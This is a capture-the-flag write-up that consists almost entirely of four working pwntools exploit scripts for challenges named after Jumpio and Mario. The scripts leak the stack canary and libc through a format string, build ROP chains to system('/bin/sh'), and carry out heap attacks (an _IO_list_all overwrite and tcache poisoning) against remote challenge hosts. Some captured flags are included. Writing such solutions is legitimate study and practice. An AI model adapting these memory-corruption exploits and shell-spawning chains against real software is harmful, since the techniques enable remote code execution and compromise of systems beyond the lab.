I love this CTF so much! hehe.

# It's me Jumpio

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./its_a_me_jumpio_patched")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
continue
'''

def one_gadget(filename, base_addr=0):
	  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]
#onegadgets = one_gadget('libc.so.6', libc.address)

def start():
    if args.REMOTE:
        return remote("94.237.48.12", 41305)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value
#HTB{h3ll0_1t5_4_m3_Jump10o00o}
#========= exploit here ===================

for i in range(10):
    r.send(b"W")

r.send(b"2")
sleep(1)
r.sendline(b"1")

#========= interactive ====================
r.interactive()

```

# Super mario kart

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./super_jumpio_kart_patched")


libc = elf.libc
context.binary = elf
context.terminal = ['tmux', 'splitw', '-hl', '130']
#context.log_level = "debug"
gs = '''
b custom
b custom + 164
continue
'''

def one_gadget(filename, base_addr=0):
	  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]
#onegadgets = one_gadget('libc.so.6', libc.address)

def start():
    if args.REMOTE:
        return remote("94.237.57.211", 44842)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

#========= exploit here ===================
sla(b">", b"4")
sleep(0.3)

payload = b"%9$p-%11$p-%12$p"
sl(payload)
leaks = rcu(b"with: ", b"\n").split(b"-")
canary = int(leaks[0], 16)
leak = int(leaks[1], 16)
libcleak = int(leaks[2], 16)

logleak("canary", canary)
logleak("leak", leak)
logleak("libc leak", libcleak)

elf.address = leak - 0x19b5
logleak("elf base", elf.address)

libc.address = libcleak - 0x203b20
libcbase()

for _ in range(7):
    line = r.recvuntil(b"turn ahead: ")
    if b"LEFT" in line:
        r.sendline(b"L")
    elif b"RIGHT" in line:
        r.sendline(b"R")
    else:
        log.error("Unexpected direction prompt")
        r.close()
        exit(1)
    r.recvuntil(b"Nice!")

r.recvuntil(b"Power Up??")
r.sendline(b"y")
log.success("vulnerable read()")

rop = ROP(libc)

poprdi = rop.find_gadget(["pop rdi", "ret"])[0] 
ret = rop.find_gadget(["ret"])[0] 
binsh = next(libc.search(b"/bin/sh"))

payload = b"A"*0x48
payload += p64(canary)
payload += b"B"*0x10
payload += b"C"*8
payload += p64(poprdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(libc.sym.system)

sa(b"victory: ", payload)

#========= interactive ====================
r.interactive()
#HTB{~~1-2-3-vr00m_vr00m_vr00m~~}
```

# refreshments

I liked this one, such a long time since this type of heap exploitation appear in a challenge, loved it.

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./refreshments")
libc = elf.libc

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hl', '100']
#context.log_level = "debug"
gs = '''
continue
'''

def one_gadget(filename, base_addr=0):
	  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]
#onegadgets = one_gadget('libc.so.6', libc.address)

def start():
    if args.REMOTE:
        return remote("94.237.48.12", 47893)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

#========= wrapper functions ===================
rcu(b">>")
index = 0
def menu(choice: int):
    sl(bc(choice))

def add():
    global index
    menu(1)
    rcu(b">>")
    index += 1
    return index - 1

def empty(idx: int):
    menu(2)
    sla(b"empty:", (bc(idx)))
    rcu(b">>")

def customize(idx: int, data: bytes):
    menu(3)
    sla(b"customize:",bc(idx))
    sa(b"drink",data)
    rcu(b">>")

def view(idx: int):
    menu(4)
    sla(b"glass:", bc(idx))
    leak = rcu(b"content: ", b"\n")
    rcu(b">>")
    return leak

#========= exploit here ===================

a = add()
b = add()
c = add()
d = add()
e = add() #guard

customize(a, b"A"*0x58+p8(0xc1))
empty(b)
b = add()
leak = u64(view(c)[:6].ljust(8,b"\x00"))
logleak("leak", leak)
libc.address = leak - 0x399b78
libcbase()

c2 = add()
empty(a)
empty(c2)


heap = u64(view(c)[:6].ljust(8,b"\x00"))
logleak(f"heap", heap)

c2 = add()
a  = add()
customize(a, b"Y"*0x58 + p8(0xc1))

empty(b)
b = add()

customize(b, p64(0)*10 + b"/bin/sh\0" + p8(0x68))
customize(c2, p64(0)+p64(libc.sym._IO_list_all - 16)+p64(1)+p64(2))
customize(e, p64(libc.sym.system)+p64(heap+0x178))

sl(b"1")

#========= interactive ====================
r.interactive()
```

# Jumpios Love letter

I managed to finish this one 20 min after the time was past for the ctf :( Still happy I managed to solve it.

```python
from pwn import *

context.binary = binary = ELF('./love_letter', checksec=False)
libc = ELF('./glibc/libc.so.6', checksec=False)

def create_note(data, author, protected=False, password=b''):
	p.sendlineafter(b'Choice: ', b'1')
	p.sendlineafter(b'> ', author)
	p.sendlineafter(b'> ', data)
	if protected:
		p.sendlineafter(b'> ', b'y')
		p.sendlineafter(b'> ', password)
	else:
		p.sendlineafter(b'> ', b'n')

def change_note(idx, author, data, protected=False, password=b''):
	p.sendlineafter(b'Choice: ', b'2')
	p.sendlineafter(b'> ', str(idx).encode())
	if protected:
		p.sendlineafter(b'password: ', password)
	p.sendlineafter(b'Author: ', author)
	p.sendlineafter(b'Content: ', data)

def print_note(idx, data=True, protected=False, password=b''):
	p.sendlineafter(b'Choice: ', b'3')
	p.sendlineafter(b'> ', str(idx).encode())
	if protected:
		p.sendlineafter(b'password: ', password)
	if data:
		p.recvuntil(b'Note: ')
		return p.recvuntil(b'-')[:-1]
	else:
		p.recvuntil(b'Author: ')
		return p.recvuntil(b'N')[:-1]

def delete_note(idx, protected=False, password=b''):
	p.sendlineafter(b'Choice: ', b'4')
	p.sendlineafter(b'> ', str(idx).encode())
	if protected:
		p.sendlineafter(b'password: ', password)

def save_notes():
	p.sendlineafter(b'Choice: ', b'5')
	p.sendlineafter(b'> ', b'AAAA')

#p = process()
p = remote('83.136.250.179',56605)

create_note(b'AAAA', b'BBBB', protected=True, password=b'pwned')
delete_note(1, protected=True, password=b'pwned')
create_note(b'CCCC', b'DDDD')
create_note(b'EEEE', b'FFFF', protected=True, password=b'pwned')
delete_note(1)

heap_base = u64(print_note(1, data=False, protected=True, password=b'pwned').ljust(8, b'\x00')) << 12
info(f'heap base @ {hex(heap_base)}')

create_note(b'AAAA', b'BBBB')
create_note(b'AAAA', b'BBBB', protected=True, password=b'pwned')
delete_note(3, protected=True, password=b'pwned')
create_note(b'CCCC', b'DDDD')
create_note(b'EEEE', b'FFFF')
delete_note(3)

change_note(1, p64(heap_base >> 12 ^ (heap_base+0x2a0))[:-2], b'aaaa', protected=True, password=b'pwned')
create_note(b'AAAA', b'BBBB', protected=True, password=p64(heap_base+0x438)[:-2])
change_note(2, p64(heap_base+0x820)[:-2], b'AAAA')
save_notes()

libc_leak = u64(print_note(1, data=True, protected=True, password=b'pwned').ljust(8, b'\x00'))
libc.address = libc_leak - 0x219ce0
info(f'libc @ {hex(libc.address)}')

change_note(2, p64(libc.symbols.environ)[:-2], b'AAAA')
environ = u64(print_note(1, data=True, protected=True, password=b'pwned').ljust(8, b'\x00'))
info(f'environ @ {hex(environ)}')

r = ROP(libc)
rc = p64(r.find_gadget(['pop rdi','ret'])[0])
rc += p64(next(libc.search(b'/bin/sh\x00')))
rc += p64(r.find_gadget(['ret'])[0])
rc += p64(libc.symbols.system)

change_note(2, p64(environ-0x140)[:-2], b'AAAA')
change_note(1, b'aaaa', rc, protected=True, password=b'pwned')

p.interactive()
```